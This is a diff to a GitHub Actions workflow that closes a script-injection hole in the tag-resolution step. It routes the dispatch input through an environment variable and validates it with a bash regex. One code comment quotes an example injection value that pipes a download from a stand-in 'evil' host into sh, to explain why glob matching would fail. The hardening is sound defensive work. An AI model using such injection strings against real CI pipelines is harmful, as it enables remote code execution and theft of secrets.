@@ -32,13 +32,29 @@ jobs:
     steps:
       - name: Resolve tag
         id: tag
+        # Never interpolate `${{ github.event.inputs.tag }}` directly into
+        # the shell script — that's a script-injection sink for anyone
+        # who can dispatch the workflow with a crafted tag string. Pass
+        # it through env and reference $TAG_INPUT instead, which the
+        # shell only parameter-expands rather than re-evaluating.
+        env:
+          TAG_INPUT: ${{ github.event.inputs.tag }}
         run: |
-          TAG="${{ github.event.inputs.tag }}"
+          TAG="$TAG_INPUT"
           if [ -z "$TAG" ]; then
             TAG="${GITHUB_REF#refs/tags/}"
           fi
           if [ -z "$TAG" ] || [ "$TAG" = "$GITHUB_REF" ]; then
             echo "::error::Could not resolve a tag from push event or workflow_dispatch input"
+            exit 1
+          fi
+          # Whitelist tag shape so even an env-passed value can't smuggle
+          # shell metachars into the rest of the workflow. Use bash's
+          # =~ regex (not shell globs — globs match `*` against anything,
+          # which would defeat the point: `v1; curl evil | sh` would
+          # have matched `v[0-9]*[A-Za-z0-9._-]`).
+          if [[ ! "$TAG" =~ ^v[0-9][A-Za-z0-9._-]*$ ]]; then
+            echo "::error::tag does not match allowed pattern: $TAG"
             exit 1
           fi
           echo "tag=$TAG" >> "$GITHUB_OUTPUT"
